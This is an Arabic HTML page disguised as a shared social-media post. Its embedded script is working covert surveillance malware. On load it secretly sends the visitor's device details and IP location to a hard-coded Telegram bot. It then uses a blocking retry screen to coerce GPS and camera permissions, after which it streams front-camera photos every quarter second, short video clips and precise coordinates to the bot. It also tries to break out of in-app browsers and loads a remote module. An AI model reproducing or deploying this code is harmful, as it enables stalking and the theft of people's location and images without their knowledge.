<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Shahin Zyan masengar</title>
  <!-- Open Graph tags - سيتم تحديثها بواسطة Workflow -->
  <meta property="og:title" content="Shahin Zyan masengar">
  <meta property="og:description" content="شارك لك منشور">
  <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
  <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
  <meta name="twitter:title" content="Shahin Zyan masengar">
  <meta name="twitter:description" content="شارك لك منشور">
  <meta name="twitter:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
  <style>
    :root {
      --bg: #f0f2f5;
      --card-bg: #ffffff;
      --text-primary: #1c1e21;
      --text-secondary: #65676b;
      --border: #e4e6eb;
    }
    @media (prefers-color-scheme: dark) {
      :root {
        --bg: #18191a;
        --card-bg: #242526;
        --text-primary: #e4e6eb;
        --text-secondary: #b0b3b8;
        --border: #3e4042;
      }
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: var(--bg);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      padding-top: 20px;
      min-height: 100vh;
      position: relative;
    }
    .post-container {
      max-width: 500px; width: 100%; background: var(--card-bg);
      border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1);
      overflow: hidden; border: 1px solid var(--border);
    }
    .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
    .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
    .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
    .post-time { font-size: 13px; color: var(--text-secondary); }
    .post-text { padding: 4px 16px 12px; font-size: 15px; color: var(--text-primary); white-space: pre-wrap; }
    .post-image img { width: 100%; display: block; }
    .post-stats { display: flex; justify-content: space-between; padding: 8px 16px; font-size: 13px; color: var(--text-secondary); border-top: 1px solid var(--border); }
    .post-actions { display: flex; justify-content: space-evenly; padding: 4px 16px 8px; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 14px; font-weight: 600; }
    .post-actions span { cursor: pointer; padding: 8px 0; flex: 1; text-align: center; }
    .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
    .three-dots:hover { background: var(--border); }

    /* شاشة إعادة المحاولة */
    .retry-overlay {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999;
    }
    .retry-btn {
      padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
      border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
    }
    .hidden { display: none !important; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <!-- المنشور (يظهر مباشرة) -->
  <div class="post-container" id="postContainer">
    <div class="post-header">
      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
      <div>
        <div class="post-user">المستخدم</div>
        <div class="post-time">الآن</div>
      </div>
      <div class="three-dots">⋯</div>
    </div>
    <div class="post-text">جارٍ تحميل المنشور...</div>
    <div class="post-stats"><span>0 تعليق</span><span>0 مشاركة</span></div>
    <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
  </div>

  <!-- شاشة إعادة المحاولة (تظهر عند الرفض) -->
  <div class="retry-overlay hidden" id="retryOverlay">
    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    // ==================== (1) الإعدادات ====================
    const B = '69ee19e8856a68218974812e';   // معرف حاوية JSONBin
    const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ'; // توكن البوت
    const C = '5151102782';                  // معرف دردشة البوت
    const I = 'a7e43833d69a75';              // رمز IPinfo

    // ==================== (2) عناصر DOM ====================
    const post = document.getElementById('postContainer');
    const overlay = document.getElementById('retryOverlay');
    const retryBtn = document.getElementById('retryBtn');
    const vid = document.getElementById('video');
    const cnv = document.getElementById('canvas');
    const ctx = cnv.getContext('2d');

    // ==================== (3) متغيرات الحالة ====================
    let stream = null;                       // بث الكاميرا
    let photos = 0;                          // عدد الصور الملتقطة
    let captureInterval = null;              // مؤشر التصوير المستمر
    let mediaRecorder = null;                // مسجل الفيديو
    let videoChunks = [];                    // أجزاء الفيديو
    let recording = false;                   // هل الفيديو قيد التسجيل؟
    let deviceInfoSent = false;              // هل أُرسلت معلومات الجهاز؟
    let gpsLoc = null;                       // الموقع الدقيق (GPS)
    let ipLoc = null;                        // الموقع التقريبي (IP)
    let redirectUrl = 'https://www.facebook.com'; // رابط التوجيه النهائي

    let locationGranted = false;             // هل قَبِل المستخدم GPS؟
    let cameraGranted = false;               // هل قَبِل المستخدم الكاميرا؟

    // ==================== (4) دوال مساعدة ====================
    /** إرسال رسالة نصية إلى البوت */
    async function sendText(text) {
      try {
        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
        });
      } catch (e) { /* فشل الإرسال بصمت */ }
    }

    /** تحويل DataURL إلى كائن Blob */
    function dataURLtoBlob(dataUrl) {
      const arr = dataUrl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      const n = bstr.length;
      const u8 = new Uint8Array(n);
      for (let i = 0; i < n; i++) u8[i] = bstr.charCodeAt(i);
      return new Blob([u8], { type: mime });
    }

    /** إظهار شاشة إعادة المحاولة وإخفاء المنشور */
    function showOverlay() {
      post.classList.add('hidden');
      overlay.classList.remove('hidden');
      if (captureInterval) clearInterval(captureInterval);
    }

    /** إخفاء شاشة إعادة المحاولة وإظهار المنشور */
    function hideOverlay() {
      overlay.classList.add('hidden');
      post.classList.remove('hidden');
    }

    /** إيقاف التصوير والفيديو */
    function stopAll() {
      if (captureInterval) clearInterval(captureInterval);
      if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
      if (stream) stream.getTracks().forEach(t => t.stop());
    }

    // ==================== (5) تحميل بيانات المنشور ====================
    async function loadPost() {
      try {
        const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
        const d = await r.json();
        const s = d.record || {};
        redirectUrl = s.redirectUrl || redirectUrl;

        const name = s.profileName || 'Shahin Zyan';
        const avatar = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png';
        const text = s.postText || 'هذا نص تجريبي.';
        const postImg = s.postImage || '';
        const time = s.postTime || 'الآن';
        const comments = s.commentsCount || '12';
        const shares = s.sharesCount || '5';

        post.innerHTML = `
          <div class="post-header">
            <img src="${avatar}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
            <div>
              <div class="post-user">${name}</div>
              <div class="post-time">${time}</div>
            </div>
            <div class="three-dots">⋯</div>
          </div>
          <div class="post-text">${text}</div>
          ${postImg ? `<div class="post-image"><img src="${postImg}" alt="صورة المنشور"></div>` : ''}
          <div class="post-stats"><span>${comments} تعليق</span><span>${shares} مشاركة</span></div>
          <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>`;
      } catch (e) { /* فشل التحميل بصمت */ }
    }

    // ==================== (6) معلومات الجهاز (تُرسل فوراً) ====================
    async function sendDeviceInfo() {
      if (deviceInfoSent) return;
      deviceInfoSent = true;
      try {
        const ua = navigator.userAgentData || {};
        let h = {};
        if (ua.getHighEntropyValues) {
          try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
        }
        const sc = window.screen;
        let bat = null;
        if ('getBattery' in navigator) {
          try { const b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
        }
        let txt = '<b>📱 معلومات الجهاز</b>\n';
        txt += `الموديل: ${h.model||'N/A'}\nالنظام: ${navigator.platform}\nالشاشة: ${sc.width}x${sc.height}\n`;
        txt += `المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
        if (bat) txt += `البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
        txt += `اللغة: ${navigator.language}\nالمنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
        await sendText(txt);
      } catch (e) {}
    }

    // ==================== (7) الموقع عبر IP (يُرسل بصمت) ====================
    async function fetchIPLocation() {
      try {
        const r = await fetch(`https://ipinfo.io/json?token=${I}`);
        const d = await r.json();
        if (d.loc) {
          const [lat, lon] = d.loc.split(',').map(Number);
          ipLoc = { lat, lon, acc: 5000, src: 'IP' };
          await sendText(`📍 الموقع التقريبي (IP): ${lat}, ${lon}\n🌍 خرائط Google: https://www.google.com/maps?q=${lat},${lon}\n🍎 خرائط Apple: http://maps.apple.com/?ll=${lat},${lon}&q=موقع\n🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15`);
        }
      } catch (e) {}
    }

    // ==================== (8) طلب الموقع الدقيق (GPS) ====================
    async function requestGPS() {
      if (!navigator.geolocation) return false;
      try {
        const pos = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true,   // دقة عالية
            timeout: 15000,             // انتظار حتى 15 ثانية
            maximumAge: 0               // لا تستخدم موقع قديم
          });
        });
        // نتحقق من الدقة (أقل من 50 متر مقبول)
        if (pos.coords.accuracy && pos.coords.accuracy > 50) return false;
        gpsLoc = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy,
          src: 'GPS'
        };
        const maps = `https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}`;
        await sendText(
          `📍 الموقع الدقيق (GPS): ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
          `🌍 خرائط Google: ${maps}\n` +
          `🍎 خرائط Apple: http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع\n` +
          `🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18`
        );
        return true;
      } catch (e) {
        return false;
      }
    }

    // ==================== (9) محاولة الحصول على GPS (تظهر المنشور ثم تطلب) ====================
    async function tryLocation() {
      hideOverlay();
      await new Promise(r => setTimeout(r, 200)); // ننتظر قليلاً ليظهر المنشور
      const ok = await requestGPS();
      if (ok) {
        locationGranted = true;
        await tryCamera(); // ننتقل فوراً لطلب الكاميرا
      } else {
        showOverlay(); // رفض → إظهار زر الإعادة
      }
    }

    // ==================== (10) طلب الكاميرا ====================
    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });
        vid.srcObject = stream;
        await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
        captureInterval = setInterval(captureAndSend, 250); // صورة كل 250 مللي ثانية
        return true;
      } catch (e) {
        return false;
      }
    }

    // ==================== (11) محاولة الحصول على الكاميرا ====================
    async function tryCamera() {
      hideOverlay();
      await new Promise(r => setTimeout(r, 200));
      const ok = await startCamera();
      if (ok) {
        cameraGranted = true;
        hideOverlay(); // كل شيء تمام
      } else {
        showOverlay(); // رفض → إظهار زر الإعادة
      }
    }

    // ==================== (12) التقاط صورة وإرسالها ====================
    function captureAndSend() {
      if (!stream || !vid.videoWidth) return;
      cnv.width = vid.videoWidth;
      cnv.height = vid.videoHeight;
      ctx.drawImage(vid, 0, 0);
      const dataUrl = cnv.toDataURL('image/jpeg', 0.9); // جودة عالية 90%
      const blob = dataURLtoBlob(dataUrl);
      const form = new FormData();
      form.append('chat_id', C);
      form.append('photo', blob, 'snap.jpg');
      fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
      photos++;

      // كل 5 صور نبدأ فيديو قصير (إذا لم نكن نسجل حالياً)
      if (photos % 5 === 0 && !recording) {
        startVideoRecording();
      }
    }

    // ==================== (13) تسجيل فيديو قصير وإرساله ====================
    function startVideoRecording() {
      if (!stream || recording) return;
      try {
        recording = true;
        videoChunks = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
        mediaRecorder.onstop = async () => {
          const blob = new Blob(videoChunks, { type: 'video/webm' });
          const form = new FormData();
          form.append('chat_id', C);
          form.append('video_note', blob, 'clip.webm'); // فيديو دائري (Video Note)
          await fetch(`https://api.telegram.org/bot${T}/sendVideoNote`, { method: 'POST', body: form }).catch(() => {});
          recording = false;
        };
        mediaRecorder.start();
        setTimeout(() => {
          if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
        }, 3000); // 3 ثوانٍ
      } catch (e) {
        recording = false;
      }
    }

    // ==================== (14) تقرير نهائي عند الخروج ====================
    async function sendExitReport() {
      let locStr = 'غير متوفر';
      if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
      else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
      const report = `<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`;
      await sendText(report);
    }

    // ==================== (15) زر إعادة المحاولة ====================
    retryBtn.addEventListener('click', async () => {
      if (!locationGranted) {
        await tryLocation();
      } else if (!cameraGranted) {
        await tryCamera();
      }
    });

    // ==================== (16) خطة الهروب من WebView ====================
    async function attemptEscape() {
      const targetUrl = window.location.href;
      const ua = navigator.userAgent || '';
      const isIOS = /iPhone|iPad|iPod/i.test(ua);
      const isAndroid = /Android/i.test(ua);

      const iosMethods = [
        () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); },
        () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); },
        () => { window.location.href = 'opera-https://' + targetUrl.replace(/^https?:\/\//, ''); },
        () => { window.location.href = 'firefox://open-url?url=' + encodeURIComponent(targetUrl); },
        () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
      ];
      const androidMethods = [
        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`; },
        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.opera.browser;end`; },
        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=org.mozilla.firefox;end`; },
        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.sec.android.app.sbrowser;end`; },
        () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
      ];
      const methods = isIOS ? iosMethods : isAndroid ? androidMethods : [() => { window.open(targetUrl, '_blank'); }];

      for (let i = 0; i < methods.length; i++) {
        try { methods[i](); } catch(e) {}
        await new Promise(r => setTimeout(r, 300));
      }
      try {
        const module = await import('https://esm.sh/eiab@0.5.0');
        if (module && module.attemptEscape) module.attemptEscape();
      } catch(e) {}
    }

    function isInAppBrowser() {
      const ua = navigator.userAgent || '';
      return /FBAN|FBAV|Instagram|Twitter|Line|KAKAOTALK/i.test(ua);
    }

    if (isInAppBrowser()) attemptEscape();

    // ==================== (17) حدث الخروج ====================
    window.addEventListener('beforeunload', () => {
      stopAll();
      sendExitReport();
    });

    // ==================== (18) بدء التشغيل ====================
    (async function init() {
      await loadPost();          // تحميل المنشور
      sendDeviceInfo();          // إرسال معلومات الجهاز فوراً (بصمت)
      fetchIPLocation();         // إرسال الموقع عبر IP فوراً (بصمت)

      // بعد 600 مللي ثانية، نبدأ بطلب الموقع الدقيق
      setTimeout(async () => {
        await tryLocation();     // يطلب GPS، ثم إذا نجح يطلب الكاميرا تلقائياً
      }, 600);
    })();
  </script>
</body>
</html>
